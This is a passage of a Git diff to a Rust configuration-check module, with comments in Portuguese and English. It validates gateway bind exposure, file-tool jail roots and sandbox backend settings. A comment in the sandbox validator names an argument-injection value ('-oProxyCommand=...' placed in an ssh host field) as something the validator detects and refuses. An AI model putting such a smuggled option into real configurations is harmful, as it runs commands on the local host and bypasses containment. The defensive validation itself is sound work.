@@ -12,6 +12,15 @@
 //!   [`ConfigLoader::load`] itself returns a parse error (not this module's
 //!   responsibility).
 //!
+//! # No boot (#1247)
+//!
+//! `garraia start` / `restart` / `start -d` rodam este mesmo [`run_check`]
+//! uma vez e entregam o resultado a [`crate::boot_gate`]: todo achado e
+//! logado, e so um `Error` da allowlist fechada `BLOQUEIA_O_BOOT` recusa o
+//! boot (exit 78, escotilha `GARRAIA_ALLOW_INVALID_CONFIG=1`). Um `Error`
+//! novo aqui NAO recusa boot sozinho: entrar na allowlist e decisao item a
+//! item, com changelog.
+//!
 //! # Redaction invariant
 //!
 //! This module MUST NOT serialize secret material. Specifically it never
@@ -25,7 +34,13 @@ use std::path::PathBuf;
 use serde::Serialize;
 
 use crate::loader::ConfigLoader;
-use crate::model::AppConfig;
+use crate::model::{AppConfig, McpServerConfig};
+// #1261: a precedencia do bind (e as constantes que espelham o clap) mora
+// em `crate::bind`, compartilhada com o boot e com os comandos cliente.
+use crate::auth::GATEWAY_API_KEY_ENV;
+use crate::bind::{
+    BindDoAmbiente as BindEfetivo, FonteDoBind, HOST_DEFAULT, HOST_ENV, PORT_DEFAULT, PORT_ENV,
+};
 
 /// Severity of a single validation finding.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
@@ -94,6 +109,11 @@ pub struct ConfigSummary {
     pub embeddings_providers: Vec<String>,
     pub mcp_servers_count: usize,
     pub log_level: Option<String>,
+    /// ADR 0024 (#1329): perfil de execucao efetivo (`standard` |
+    /// `isolated-pod`), com a env `GARRAIA_EXECUTION_PROFILE` aplicada.
+    pub execution_profile: String,
+    /// De onde o perfil veio: `default` | `file` | `env`.
+    pub execution_profile_source: String,
 }
 
 impl ConfigCheck {
@@ -129,9 +149,19 @@ impl ConfigCheck {
 /// the full set from `CLAUDE.md` rule #6 plus auth/db/metrics/telemetry
 /// plumbing. See [`detect_env_vars`] for the read-semantics contract.
 const KNOWN_GARRAIA_ENV_VARS: &[&str] = &[
+    // #1247: a escotilha do `boot_gate` (`crate::boot_gate::ESCAPE_ENV`).
+    // Ligada, o boot sobe com Error da allowlist; o check tem de mostrar que
+    // ela esta no ambiente, ou ninguem ve por que um TLS pela metade subiu.
+    "GARRAIA_ALLOW_INVALID_CONFIG",
     "GARRAIA_APP_DATABASE_URL",
     "GARRAIA_CONFIG_DIR",
     "GARRAIA_DATA_DIR",
+    // ADR 0024 (#1329): vence `execution.profile`; valor invalido e erro de
+    // carga no gateway e `Error` aqui (`validate_execution`).
+    "GARRAIA_EXECUTION_PROFILE",
+    // #1261: credencial do gateway por env (vence `gateway.api_key`). So o
+    // nome aparece aqui; o valor nunca.
+    "GARRAIA_GATEWAY_API_KEY",
     "GARRAIA_JWT_SECRET",
     "GARRAIA_LOGIN_DATABASE_URL",
     "GARRAIA_LOG_FORMAT",
@@ -208,10 +238,21 @@ fn source_report(loader: &ConfigLoader) -> SourceReport {
     }
 }
 
+/// O resultado da leitura de `GARRAIA_EXECUTION_PROFILE`, lido UMA vez por
+/// `run_check` e injetado em `validate_com_env`/`summarise_com_env` — para o
+/// nucleo do check ser puro e os testes cobrirem o valor invalido sem por um
+/// valor invalido na env de verdade (review C7 da #1329).
+type PerfilDaEnv =
+    Result<Option<crate::execution::ExecutionProfile>, crate::execution::ExecutionProfileError>;
+
 /// `mcp_servers_count` comes from the caller so it can reflect the merged
 /// view (config.yml `mcp:` + mcp.json) — counting only `config.mcp` reported
 /// 0 even when mcp.json had working servers.
-fn summarise(config: &AppConfig, mcp_servers_count: usize) -> ConfigSummary {
+fn summarise_com_env(
+    config: &AppConfig,
+    mcp_servers_count: usize,
+    env: &PerfilDaEnv,
+) -> ConfigSummary {
     let mut llm_providers: Vec<String> = config.llm.keys().cloned().collect();
     llm_providers.sort();
 
@@ -235,10 +276,15 @@ fn summarise(config: &AppConfig, mcp_servers_count: usize) -> ConfigSummary {
     let tls_enabled =
         config.gateway.tls_cert_path.is_some() && config.gateway.tls_key_path.is_some();
 
+    let (execution_profile, execution_profile_source) =
+        perfil_efetivo_para_o_check(&config.execution, env);
+
     ConfigSummary {
         gateway_host: config.gateway.host.clone(),
         gateway_port: config.gateway.port,
-        gateway_api_key_set: config.gateway.api_key.is_some(),
+        // #1241/#1261: a mesma regra do gate (em branco = ausente), com a
+        // credencial de `GARRAIA_GATEWAY_API_KEY` incluida. So presenca.
+        gateway_api_key_set: config.gateway.api_key_configurada(),
         tls_enabled,
         channels_count: config.channels.len(),
         llm_providers,
@@ -249,10 +295,41 @@ fn summarise(config: &AppConfig, mcp_servers_count: usize) -> ConfigSummary {
         embeddings_providers,
         mcp_servers_count,
         log_level: config.log_level.clone(),
+        execution_profile: execution_profile.as_str().to_string(),
+        execution_profile_source: execution_profile_source.as_str().to_string(),
     }
 }
 
+/// O perfil efetivo e a origem, como o `config check` os reporta.
+///
+/// Recebe a env ja lida porque o check recebe um `AppConfig` vindo de
+/// `load_para_o_check` (o caminho que deixa um valor invalido virar Finding
+/// em vez de exit 65). Com env valida a resposta e a mesma que
+/// `ConfigLoader::load` teria dado; com env invalida — que
+/// `validate_execution` reporta como `Error` — o sumario mostra o que o
+/// arquivo diz, que e o que o loader usaria sem a env.
+fn perfil_efetivo_para_o_check(
+    execution: &crate::execution::ExecutionConfig,
+    env: &PerfilDaEnv,
+) -> (
+    crate::execution::ExecutionProfile,
+    crate::execution::ProfileSource,
+) {
+    match env {
+        Ok(Some(p)) => (*p, crate::execution::ProfileSource::Env),
+        _ => (execution.perfil(), execution.origem()),
+    }
+}
+
+/// [`validate_com_env`] sem env — o que os testes deste modulo chamam. Pura:
+/// nenhum teste daqui depende do ambiente do desenvolvedor nem precisa de
+/// lock para ler `GARRAIA_EXECUTION_PROFILE`, `HOST` ou `PORT`.
+#[cfg(test)]
 fn validate(config: &AppConfig) -> Vec<Finding> {
+    validate_com_env(config, &Ok(None), &BindDaEnv::default())
+}
+
+fn validate_com_env(config: &AppConfig, env: &PerfilDaEnv, bind_env: &BindDaEnv) -> Vec<Finding> {
     let mut findings: Vec<Finding> = Vec::new();
     let push_err = |findings: &mut Vec<Finding>, field: &str, message: String| {
         findings.push(Finding {
@@ -348,36 +425,178 @@ fn validate(config: &AppConfig) -> Vec<Finding> {
         _ => {}
     }
 
-    // Bind exposure: 0.0.0.0/:: listens on every interface, and the bulk of
-    // the /api/* + /ws surface has no credential gate of its own, so only
-    // an api_key + TLS deployment (or network topology) protects it.
-    // `garra start --host` / the HOST env var overwrite this file value at
-    // runtime, so this reflects the config file, not necessarily the live
-    // process.
-    let bind_all_interfaces = config.gateway.host == "0.0.0.0"
-        || config.gateway.host == "::"
-        || config.gateway.host == "[::]";
+    // Bind exposure: a non-loopback bind puts /api/* + /ws on the network,
+    // and the bulk of that surface has no credential gate of its own.
+    //
+    // #1261: o bind que vale e o de `garraia start`/`restart` — flag > env >
+    // default do clap. `gateway.host`/`gateway.port` do arquivo estao
+    // deprecados (nada os le para ligar o socket) e entram so como achado a
+    // parte, nunca como fallback do veredito. O check ve a env (mesmo
+    // processo); a flag de um start futuro, nao — e o texto diz isso.
+    //
+    // Desde a decisao A do #1261, `garraia start` RECUSA um bind exposto sem
+    // credencial (`crate::bind::verificar`). Entao aqui isso e **Error**: um
+    // `config check` limpo sobre uma config que o start recusa seria mentira.
+    let bin = garraia_common::executavel::nome();
+    let bind = bind_efetivo(bind_env.host.as_deref(), bind_env.port.as_deref());
     let tls_enabled =
         config.gateway.tls_cert_path.is_some() && config.gateway.tls_key_path.is_some();
-    if bind_all_interfaces && (config.gateway.api_key.is_none() || !tls_enabled) {
-        let mut unguarded: Vec<&str> = Vec::new();
-        if config.gateway.api_key.is_none() {
-            unguarded.push("gateway.api_key is not set");
+    // #1241: `api_key_configurada` e a regra unica (em branco = ausente), e
+    // desde o #1261 ela inclui `GARRAIA_GATEWAY_API_KEY` (`run_check` injeta
+    // a env em `api_key_env` antes de chegar aqui).
+    let api_key_configurada = config.gateway.api_key_configurada();
+    let opt_out = config.gateway.allow_unauthenticated_network_bind;
+    let origem = match bind.host_source {
+        FonteDoBind::Env => format!(
+            "{HOST_ENV}=`{}` (env var, which overrides the clap default `{HOST_DEFAULT}` \
+             at `{bin} start`)",
+            bind.host
+        ),
+        FonteDoBind::DefaultDoClap => format!("host `{}` (clap default)", bind.host),
+    };
+    let porta = match bind.port_source {
+        FonteDoBind::Env => format!("port {} (from {PORT_ENV})", bind.port),
+        FonteDoBind::DefaultDoClap => format!("port {} (clap default)", bind.port),
+    };
+    let ressalva = format!(
+        "Caveat: this check sees this process's {HOST_ENV}/{PORT_ENV} env vars and the \
+         clap defaults, but NOT a `--host`/`--port` flag passed to `{bin} start` or \
+         `{bin} restart` later — a flag still wins over both, and `{bin} start` repeats \
+         this decision on the real bind"
+    );
+    let alcance = match exposicao_do_host(&bind.host) {
+        ExposicaoDoHost::Loopback => None,
+        ExposicaoDoHost::TodasAsInterfaces => Some("listens on every interface"),
+        ExposicaoDoHost::NaoLoopback => {
+            Some("is not a loopback address, so the gateway is reachable from the network")
         }
-        if !tls_enabled {
-            unguarded.push("TLS is disabled");
+        ExposicaoDoHost::Indeterminada => {
+            if !api_key_configurada || !tls_enabled {
+                push_warn(
+                    &mut findings,
+                    "gateway.host",
+                    format!(
+                        "{origem} is a hostname, not an IP literal, so this check cannot tell \
+                         whether {porta} lands on loopback or on a network-facing address — \
+                         `{bin} start` resolves it and refuses to boot if any resolved address \
+                         is not loopback while no gateway credential is set. Prefer an IP \
+                         literal. {ressalva}"
+                    ),
+                );
+            }
+            None
         }
+    };
+    if let Some(alcance) = alcance {
+        if !api_key_configurada && !opt_out {
+            push_err(
+                &mut findings,
+                "gateway.host",
+                format!(
+                    "{origem} {alcance} while no gateway credential is set, so \
+                     `{bin} start` will REFUSE to boot on {porta}. Fix: run `{bin} init`, \
+                     set gateway.api_key, export {GATEWAY_API_KEY_ENV}, or bind \
+                     {HOST_DEFAULT} (`--host {HOST_DEFAULT}`); an intentionally open \
+                     deployment behind an authenticating proxy can set \
+                     gateway.allow_unauthenticated_network_bind: true in the file. {ressalva}"
+                ),
+            );
+        } else if !api_key_configurada {
+            push_warn(
+                &mut findings,
+                "gateway.host",
+                format!(
+                    "{origem} {alcance} WITHOUT a gateway credential: \
+                     gateway.allow_unauthenticated_network_bind is true, so `{bin} start` \
+                     boots anyway — make sure an authenticating proxy or a firewall protects \
+                     {porta}. {ressalva}"
+                ),
+            );
+        } else if !tls_enabled {
+            push_warn(
+                &mut findings,
+                "gateway.host",
+                format!(
+                    "{origem} {alcance} while TLS is disabled — the gateway credential travels \
+                     in clear text; make sure a firewall or TLS-terminating reverse proxy \
+                     protects {porta}, or switch to {HOST_DEFAULT}. {ressalva}"
+                ),
+            );
+        }
+    }
+
+    // O opt-out e dito SEMPRE, mesmo com o bind em loopback hoje: e uma
+    // guarda desligada esperando o proximo `HOST=0.0.0.0`.
+    if opt_out {
+        push_warn(
+            &mut findings,
+            "gateway.allow_unauthenticated_network_bind",
+            format!(
+                "gateway.allow_unauthenticated_network_bind: true disables the #1261 boot \
+                 refusal: a non-loopback bind without a gateway credential boots (with a loud \
+                 warning) instead of being refused. Keep it only behind an authenticating \
+                 proxy or firewall; prefer gateway.api_key or {GATEWAY_API_KEY_ENV}."
+            ),
+        );
+    }
+
+    // Env e arquivo com credenciais diferentes: a env vence, e quem editou o
+    // arquivo acredita numa chave que o gate nao usa. So presenca no texto.
+    if let (Some(_), Some(arquivo)) = (
+        config
+            .gateway
+            .api_key_env
+            .as_ref()
+            .map(|s| secrecy::ExposeSecret::expose_secret(s).trim())
+            .filter(|k| !k.is_empty()),
+        config
+            .gateway
+            .api_key
+            .as_deref()
+            .map(str::trim)
+            .filter(|k| !k.is_empty()),
+    ) && config.gateway.api_key_normalizada() != Some(arquivo)
+    {
+        push_warn(
+            &mut findings,
+            "gateway.api_key",
+            format!(
+                "{GATEWAY_API_KEY_ENV} and gateway.api_key are both set and differ: the env var \
+                 wins, so the key in the config file is not the one clients must send. Remove \
+                 one of them."
+            ),
+        );
+    }
+
+    // As chaves do arquivo que o start nao le (#1261, decisao B: deprecadas).
+    // Quando diferem do bind efetivo, quem as escreveu acredita numa coisa
+    // que nao acontece — nos dois sentidos.
+    if config.gateway.host.trim() != bind.host.trim() {
         push_warn(
             &mut findings,
             "gateway.host",
             format!(
-                "gateway.host=`{}` binds all interfaces while {} — make sure a firewall or \
-                 TLS-terminating reverse proxy protects port {}, or switch to 127.0.0.1. \
-                 Note: `garra start --host` / the HOST env var can override this file value \
-                 at runtime",
-                config.gateway.host,
-                unguarded.join(" and "),
-                config.gateway.port
+                "gateway.host=`{}` in the config file is deprecated and not read by \
+                 `{bin} start` (it binds {HOST_DEFAULT}:{PORT_DEFAULT} unless \
+                 {HOST_ENV}/{PORT_ENV} or `--host`/`--port` are set; this check resolved host \
+                 `{}`) — remove the key, and set {HOST_ENV} or pass `--host` if you meant it; \
+                 see docs/auth-config.md section 5.1",
+                config.gateway.host, bind.host
+            ),
+        );
+    }
+    // `port: 0` ja e Error acima; repetir como chave morta so faria eco.
+    if config.gateway.port != 0 && config.gateway.port != bind.port {
+        push_warn(
+            &mut findings,
+            "gateway.port",
+            format!(
+                "gateway.port=`{}` in the config file is deprecated and not read by \
+                 `{bin} start` (it binds {HOST_DEFAULT}:{PORT_DEFAULT} unless \
+                 {HOST_ENV}/{PORT_ENV} or `--host`/`--port` are set; this check resolved port \
+                 {}) — remove the key, and set {PORT_ENV} or pass `--port` if you meant it; \
+                 see docs/auth-config.md section 5.1",
+                config.gateway.port, bind.port
             ),
         );
     }
@@ -665,6 +884,19 @@ fn validate(config: &AppConfig) -> Vec<Finding> {
     // storage (plan 0044): validate the object storage backend config.
     validate_storage(&config.storage, &mut findings, &push_err, &push_warn);
 
+    // hardware (ADR 0020 / #1126): validate the MQTT transport config.
+    validate_hardware(&config.hardware, &mut findings, &push_err);
+
+    // agent.sandbox (#1225): a containment control that is silently inert is
+    // worse than one that is off, because the operator stops watching.
+    validate_sandbox(&config.agent, &mut findings, &push_err, &push_warn);
+
+    // execution (ADR 0024 / #1329): env ou arquivo invalido e Error (o
+    // gateway nao sobe); `pod_root` e `owners` fora de `isolated-pod` sao
+    // Warning, porque sao config que o operador acha que faz algo e nao faz.
+    findings.extend(validate_execution(&config.execution, env, &config.channels));
+    validate_whatsapp_linked_identidades(&config.channels, &mut findings, &push_warn);
+
     // auth (plan 0046 §5.5): validate the non-secret JWT/refresh/metrics
     // knobs. Secret env vars remain enforced at AuthConfig::from_env.
     validate_auth(&config.auth, &mut findings, &push_err, &push_warn);
@@ -676,8 +908,11 @@ fn validate(config: &AppConfig) -> Vec<Finding> {
     validate_line(&config.channels, &mut findings, &push_warn);
     validate_whatsapp(&config.channels, &mut findings, &push_warn);
     validate_teams(&config.channels, &mut findings, &push_warn);
-    validate_retention(&config.memory, &mut findings, &push_err, &push_warn);
+    // #1436: as faixas da retencao moram em `crate::retention`, que o
+    // `PATCH /admin/api/retention` tambem usa — uma regra, dois consumidores.
+    findings.extend(crate::retention::memory_findings(&config.memory));
     validate_ingestion(&config.memory, &mut findings, &push_err, &push_warn);
+    findings.extend(crate::retention::run_ledger_findings(&config.runs));
 
     // Channels: warn when a channel is enabled but its well-known token
     // env var is not set and no inline credential is present. This helps
@@ -728,78 +963,208 @@ fn validate(config: &AppConfig) -> Vec<Finding> {
         }
     }
 
+    // #1244: agent.file_roots amplia o que as file tools do agente alcancam.
+    // Uma raiz `/` ou o proprio `$HOME` devolve `~/.ssh`, `.env` e o
+    // `config.yml` do gateway ao alcance de um prompt vindo de um canal — que
+    // e exatamente o jail sendo desligado por configuracao.
+    //
+    // A env entra junto: `GARRAIA_FILE_ROOTS` **soma** raizes as da config
+    // (`FileJail::from_config_roots`), e checar so o YAML deixava
+    // `GARRAIA_FILE_ROOTS=/` desligar o jail sem uma palavra de ninguem.
+    findings.extend(validate_file_roots(
+        &config.agent.file_roots,
+        &env_file_roots(),
+        home_dir_for_check(),
+    ));
+
     findings
 }
 
-/// Politica de retencao da memoria do agente (#956, #959).
+/// Funcao pura: dadas as envs, qual bind `config check` pode afirmar.
+/// Delegada a [`crate::bind::bind_de`], a mesma regra do boot.
+fn bind_efetivo(host_da_env: Option<&str>, porta_da_env: Option<&str>) -> BindEfetivo {
+    crate::bind::bind_de(host_da_env, porta_da_env)
+}
+
+/// O que um host diz sobre alcance de rede, pelo mesmo criterio do gateway
+/// (`server.rs` avisa quando `bound.ip()` nao e loopback).
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum ExposicaoDoHost {
+    /// `127.0.0.0/8`, `::1` ou o nome `localhost`: so a propria maquina.
+    Loopback,
+    /// Endereco nao especificado (`0.0.0.0`, `::` e grafias equivalentes):
+    /// toda interface.
+    TodasAsInterfaces,
+    /// Um IP concreto fora do loopback (LAN, publico): alcancavel da rede.
+    NaoLoopback,
+    /// Nao e um literal de IP — um hostname que so o bind resolve; o check
+    /// nao consegue julgar.
+    Indeterminada,
+}
+
+/// Classifica o host como o gateway classificaria o socket que abriu.
+/// Aceita a grafia com colchetes (`[::]`) que o `SocketAddr` aceita.
+fn exposicao_do_host(host: &str) -> ExposicaoDoHost {
+    let h = host.trim();
+    let h = h
+        .strip_prefix('[')
+        .and_then(|resto| resto.strip_suffix(']'))
+        .unwrap_or(h);
+    // `localhost` e o unico nome que vale a pena conhecer: resolve para
+    // loopback em qualquer maquina sa, e e o que muita gente escreve.
+    if h.eq_ignore_ascii_case("localhost") {
+        return ExposicaoDoHost::Loopback;
+    }
+    match h.parse::<std::net::IpAddr>() {
+        Ok(ip) if ip.is_loopback() => ExposicaoDoHost::Loopback,
+        Ok(ip) if ip.is_unspecified() => ExposicaoDoHost::TodasAsInterfaces,
+        Ok(_) => ExposicaoDoHost::NaoLoopback,
+        Err(_) => ExposicaoDoHost::Indeterminada,
+    }
+}
+
+/// O valor de uma env so quando ele diz alguma coisa: vazia ou so espaco
+/// conta como ausente, como no resto deste modulo. Diferenca benigna do
+/// clap real: `HOST="  "` aqui vira "ausente" (cai para o default do clap),
+/// mas um `garra start` de verdade passaria isso adiante e falharia no
+/// parse do `SocketAddr` — nunca produz um falso "nao exposto", so um "nao
+/// vi nada de errado" onde o start real teria erro de config.
+fn env_nao_vazia(nome: &str) -> Option<String> {
+    normalizar_env(std::env::var(nome).ok().as_deref())
+}
+
+/// Valor de env em branco (ou so espaco) nao e escolha: vale como ausente.
+fn normalizar_env(valor: Option<&str>) -> Option<String> {
+    valor
+        .map(str::trim)
+        .filter(|v| !v.is_empty())
+        .map(str::to_string)
+}
+
+/// `HOST`/`PORT` do processo, lidos UMA vez por [`run_check`] e injetados no
+/// nucleo puro. Antes o [`validate_com_env`] lia as duas envs por dentro, e
+/// um teste que ligava `HOST=0.0.0.0` sob o `ENV_TEST_LOCK` vazava o valor
+/// para qualquer teste vizinho que chamasse `validate` sem o lock: o
+/// "config padrao sem erros" falhou no CI com um achado de exposicao que
+/// nao tinha nada a ver com ele (#1261).
+#[derive(Debug, Default, Clone)]
+struct BindDaEnv {
+    host: Option<String>,
+    port: Option<String>,
+}
+
+impl BindDaEnv {
+    fn do_processo() -> Self {
+        Self {
+            host: env_nao_vazia(HOST_ENV),
+            port: env_nao_vazia(PORT_ENV),
+        }
+    }
+}
+
+/// O `$HOME` do processo, para [`validate_file_roots`]. Separado para o teste
+/// poder passar um home falso sem mexer no ambiente do processo.
+fn home_dir_for_check() -> Option<PathBuf> {
+    std::env::var_os("HOME")
+        .or_else(|| std::env::var_os("USERPROFILE"))
+        .filter(|v| !v.is_empty())
+        .map(PathBuf::from)
+}
+
+/// A env que **soma** raizes as de `agent.file_roots`.
 ///
-/// A retencao apaga dado do usuario, entao a validacao e mais dura do que o
-/// normal: uma faixa errada aqui nao produz um erro em runtime, produz uma
-/// varredura que apaga o que nao devia — ou que nunca roda e deixa o operador
-/// achando que roda.
-fn validate_retention(
-    memory: &crate::model::MemoryConfig,
-    findings: &mut Vec<Finding>,
-    push_err: &impl Fn(&mut Vec<Finding>, &str, String),
-    push_warn: &impl Fn(&mut Vec<Finding>, &str, String),
-) {
-    use crate::model::{
-        RETENTION_INTERVAL_MAX_HOURS, RETENTION_INTERVAL_MIN_HOURS, RETENTION_MAX_AGE_MAX_DAYS,
-        RETENTION_MAX_AGE_MIN_DAYS,
-    };
+/// Escrita aqui por extenso porque `garraia-config` nao depende de
+/// `garraia-agents` (de proposito): o dono da constante e
+/// `garraia_agents::tools::file_jail::ROOTS_ENV`, e
+/// `garraia-gateway`, que ve os dois lados, tem um teste que impede as duas
+/// grafias de divergirem.
+pub const FILE_ROOTS_ENV: &str = "GARRAIA_FILE_ROOTS";
 
-    let r = &memory.retention;
+/// O campo com que um achado vindo da env e reportado.
+const FILE_ROOTS_ENV_FIELD: &str = "env.GARRAIA_FILE_ROOTS";
 
-    if r.max_age_days < RETENTION_MAX_AGE_MIN_DAYS || r.max_age_days > RETENTION_MAX_AGE_MAX_DAYS {
-        push_err(
-            findings,
-            "memory.retention.max_age_days",
-            format!(
-                "memory.retention.max_age_days ({}) must be in [{RETENTION_MAX_AGE_MIN_DAYS}, {RETENTION_MAX_AGE_MAX_DAYS}] days",
-                r.max_age_days
-            ),
-        );
+/// As raizes declaradas em [`FILE_ROOTS_ENV`], no mesmo formato de `PATH` que
+/// `FileJail::from_config_roots` consome.
+fn env_file_roots() -> Vec<String> {
+    match std::env::var_os(FILE_ROOTS_ENV) {
+        Some(raw) => std::env::split_paths(&raw)
+            .map(|p| p.to_string_lossy().into_owned())
+            .collect(),
+        None => Vec::new(),
     }
+}
 
-    if r.interval_hours < RETENTION_INTERVAL_MIN_HOURS
-        || r.interval_hours > RETENTION_INTERVAL_MAX_HOURS
-    {
-        push_err(
-            findings,
-            "memory.retention.interval_hours",
-            format!(
-                "memory.retention.interval_hours ({}) must be in [{RETENTION_INTERVAL_MIN_HOURS}, {RETENTION_INTERVAL_MAX_HOURS}] hours",
-                r.interval_hours
-            ),
-        );
-    }
+/// Uma raiz comparavel: resolvida quando o disco deixa, normalizada por
+/// componentes quando nao.
+///
+/// A comparacao acontece **depois** de resolver porque `$HOME/../$USER`,
+/// `$HOME/link-para-si-mesmo` e o `$HOME` sao a mesma raiz perigosa escrita
+/// de tres jeitos, e so o `canonicalize` achata `..` e segue symlink.
+///
+/// `.` e `//` **nao** estao nessa lista, e a distincao importa para quem
+/// mexer aqui: `Path::parent` e o `PartialEq` de `Path` comparam por
+/// componente, entao `/.` ja devolvia `parent() == None` e `$HOME/.` ja era
+/// `== $HOME` sem ajuda nenhuma. O `components().collect()` do fallback
+/// existe so para o caso em que `canonicalize` falha (raiz ainda inexistente,
+/// caminho de outro sistema num teste) — nao e ele que fecha o buraco.
+fn normalizar_raiz(path: &std::path::Path) -> PathBuf {
+    std::fs::canonicalize(path).unwrap_or_else(|_| path.components().collect())
+}
 
-    // Politica ligada com a memoria desligada nao apaga nada — mas quem
-    // escreveu a config acha que apaga.
-    if r.enabled && !memory.enabled {
-        push_warn(
-            findings,
-            "memory.retention.enabled",
-            "memory.retention.enabled=true but memory.enabled=false; the retention sweep never runs"
-                .into(),
-        );
-    }
+/// Nucleo puro do aviso de raizes de file tool (#1244).
+///
+/// Avisa — nao e erro: um operador pode ter motivo para abrir o home inteiro,
+/// e `config check` nao e quem decide isso. Mas ele tem de dizer em voz alta,
+/// porque a diferenca entre "o agente le o projeto" e "o agente le a chave
+/// SSH" e uma linha de YAML — ou uma variavel de ambiente.
+fn validate_file_roots(
+    config_roots: &[String],
+    env_roots: &[String],
+    home: Option<PathBuf>,
+) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    let home = home.map(|h| normalizar_raiz(&h));
+    let entradas = config_roots
+        .iter()
+        .map(|raw| ("agent.file_roots", raw))
+        .chain(env_roots.iter().map(|raw| (FILE_ROOTS_ENV_FIELD, raw)));
 
-    // Uma varredura mais rara que a propria janela deixa dado vencido vivo por
-    // ate um intervalo inteiro depois do prazo. Nao e erro, e surpresa.
-    if r.enabled && u64::from(r.interval_hours) > u64::from(r.max_age_days) * 24 {
-        push_warn(
-            findings,
-            "memory.retention.interval_hours",
-            format!(
-                "memory.retention.interval_hours ({}) is longer than max_age_days ({} days = {} hours); \
-                 entries can outlive the window by a full interval",
-                r.interval_hours,
-                r.max_age_days,
-                u64::from(r.max_age_days) * 24
-            ),
-        );
+    for (campo, raw) in entradas {
+        let trimmed = raw.trim();
+        if trimmed.is_empty() {
+            findings.push(Finding {
+                severity: Severity::Warning,
+                field: campo.to_owned(),
+                message: format!("{campo} contains an empty entry; it is ignored"),
+            });
+            continue;
+        }
+        let resolvida = normalizar_raiz(std::path::Path::new(trimmed));
+        if resolvida.parent().is_none() {
+            findings.push(Finding {
+                severity: Severity::Warning,
+                field: campo.to_owned(),
+                message: format!(
+                    "{campo} includes the filesystem root (`{trimmed}`) — this turns the \
+                     file-tool jail off: the agent can read /etc, ~/.ssh and the gateway's own \
+                     config. Point it at the project directory instead (issue #1244)."
+                ),
+            });
+            continue;
+        }
+        if home.as_deref() == Some(resolvida.as_path()) {
+            findings.push(Finding {
+                severity: Severity::Warning,
+                field: campo.to_owned(),
+                message: format!(
+                    "{campo} includes $HOME (`{trimmed}`) — that puts ~/.ssh, ~/.aws and \
+                     any .env under it within reach of a prompt arriving from a channel. Prefer a \
+                     project subdirectory (issue #1244)."
+                ),
+            });
+        }
     }
+    findings
 }
 
 /// Filtro de ruido na ingestao (#952).
@@ -1583,6 +1948,402 @@ fn validate_storage(
     }
 }
 
+/// hardware (ADR 0020 / #1126): validate the MQTT transport config.
+///
+/// O broker precisa ser um `host:port` válido — o adapter conecta no boot
+/// e um endereço mal-formado viraria um crash/silêncio tarde demais. O
+/// `password_env` é presence-only: nunca ecoamos o valor (ele nem passa
+/// por aqui — config carrega só o nome da env var).
+fn validate_hardware(
+    hardware: &crate::model::HardwareConfig,
+    findings: &mut Vec<Finding>,
+    push_err: &impl Fn(&mut Vec<Finding>, &str, String),
+) {
+    if let Some(mqtt) = &hardware.mqtt {
+        valida_mqtt(mqtt, findings, push_err);
+    }
+    if let Some(ha) = &hardware.home_assistant {
+        valida_home_assistant(ha, findings, push_err);
+    }
+    if let Some(automacoes) = &hardware.automations {
+        valida_automacoes(automacoes, findings, push_err);
+    }
+}
+
+/// `agent.sandbox` (#1225): every finding here describes a config that parses
+/// and boots but does NOT contain what the operator thinks it contains.
+///
+/// Two shapes of failure live here. The loud one is a contention that is on
+/// and inert (an empty allowlist, `elevated` covering the only wrapped tool).
+/// The dangerous one is a value that stops being data and becomes an
+/// **option**: `sh_quote` guarantees one token, and a token starting with `-`
+/// is still read as a flag by `ssh` and by `docker run` — see
+/// [`crate::sandbox::parece_opcao`].
+///
+/// The redaction invariant holds trivially: nothing in this section is a
+/// secret. `ssh_host` is never echoed — it names infrastructure, and the
+/// findings only need to say whether it is present and whether it is shaped
+/// like a host. Tool names ARE echoed: they are not secrets, and naming the
+/// typo is the whole point of the finding.
+fn validate_sandbox(
+    agent: &crate::model::AgentConfig,
+    findings: &mut Vec<Finding>,
+    push_err: &impl Fn(&mut Vec<Finding>, &str, String),
+    push_warn: &impl Fn(&mut Vec<Finding>, &str, String),
+) {
+    use crate::sandbox::{
+        SandboxBackendKind, SandboxMode, TOOLS_SANDBOXAVEIS, TOOLS_SO_NO_HOST, parece_opcao,
+    };
+    let sb = &agent.sandbox;
+    if sb.mode == SandboxMode::Off {
+        // `off` is the default and the whole section is inert; flagging the
+        // other fields here would nag every operator who left a backend
+        // configured while temporarily turning the sandbox off.
+        return;
+    }
+
+    // Non-unix: the BashTool picks `powershell -Command` and would be handed a
+    // POSIX-quoted line. `wrap_command` refuses fail-closed there, so this is
+    // an Error and not a Warning — the sandbox simply cannot work.
+    if cfg!(windows) {
+        push_err(
+            findings,
+            "agent.sandbox.mode",
+            "agent.sandbox is unix-only: outside unix the bash tool runs commands through \
+             `powershell -Command`, which does not reparse the POSIX quoting the sandbox emits. \
+             wrap_command refuses fail-closed, so every command would be blocked. Use `off`."
+                .to_string(),
+        );
+    }
+
+    // mode != off without a backend: `wrap_command` fails closed on EVERY
+    // command, so the agent loses `bash` entirely. Safe, and useless.
+    if sb.backend.is_none() {
+        push_err(
+            findings,
+            "agent.sandbox.backend",
+            "agent.sandbox.mode is not `off` but agent.sandbox.backend is unset; every sandboxed \
+             command will fail closed. Set it to `docker`, `podman` or `ssh`."
+                .to_string(),
+        );
+    }
+
+    // `image` is a positional argument of `docker run`. A value starting with
+    // `-` is parsed as an option and shifts every positional after it.
+    if let Some(img) = sb.image.as_deref().map(str::trim)
+        && parece_opcao(img)
+    {
+        push_err(
+            findings,
+            "agent.sandbox.image",
+            "agent.sandbox.image starts with `-`, so `docker run`/`podman run` would read it as \
+             an OPTION instead of the image name, shifting every positional after it. No real \
+             image name starts with `-`; the value is refused and the default image is used."
+                .to_string(),
+        );
+    }
+
+    if sb.backend == Some(SandboxBackendKind::Ssh) {
+        let host = sb.ssh_host.as_deref().map(str::trim).unwrap_or("");
+        if host.is_empty() {
+            push_err(
+                findings,
+                "agent.sandbox.ssh_host",
+                "agent.sandbox.backend=ssh requires agent.sandbox.ssh_host; without it no backend \
+                 is built and every sandboxed command fails closed."
+                    .to_string(),
+            );
+        } else if parece_opcao(host) {
+            // The host sits BEFORE `--` in `ssh {host} -- sh -lc ...`, so a
+            // token starting with `-` is an ssh option, not a destination.
+            // `-oProxyCommand=...` executes on the LOCAL host, which is the
+            // exact inverse of what the sandbox is for — and it skips the
+            // safety gate, which already ran on the inner command.
+            push_err(
+                findings,
+                "agent.sandbox.ssh_host",
